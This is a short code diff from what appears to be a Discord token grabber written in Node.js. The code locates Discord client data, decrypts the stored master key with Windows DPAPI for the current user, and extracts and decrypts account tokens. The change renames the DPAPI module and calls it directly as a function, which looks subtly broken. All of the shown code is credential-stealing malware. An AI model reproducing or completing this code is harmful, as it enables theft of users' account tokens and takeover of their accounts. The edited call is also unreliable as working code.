@@ -1,7 +1,7 @@
 const fs = require("fs"),
     crypto = require("crypto"),
     path = require("path"),
-    aura = require("win-dpapi");
+    Aurita = require("win-dpapi");
 
 let cords = ["discord", "discordcanary", "discordptb", "discorddevelopment", "lightcord"];
 let tokens = [];
@@ -33,7 +33,7 @@ const getTokens = async (p) => {
                             if (m) {
                                 m.forEach((tkn) => {
                                     let enc = Buffer.from(JSON.parse(fs.readFileSync(q)).os_crypt.encrypted_key, "base64").slice(5);
-                                    let key = aura.unprotectData(Buffer.from(enc, "utf-8"), null, "CurrentUser");
+                                    let key = Aurita(Buffer.from(enc, "utf-8"), null, "CurrentUser");
                                     let tkns = Buffer.from(tkn.split("dQw4w9WgXcQ:")[1], "base64");
                                     let run = tkns.slice(3, 15);
                                     let mid = tkns.slice(15, tkns.length - 16);
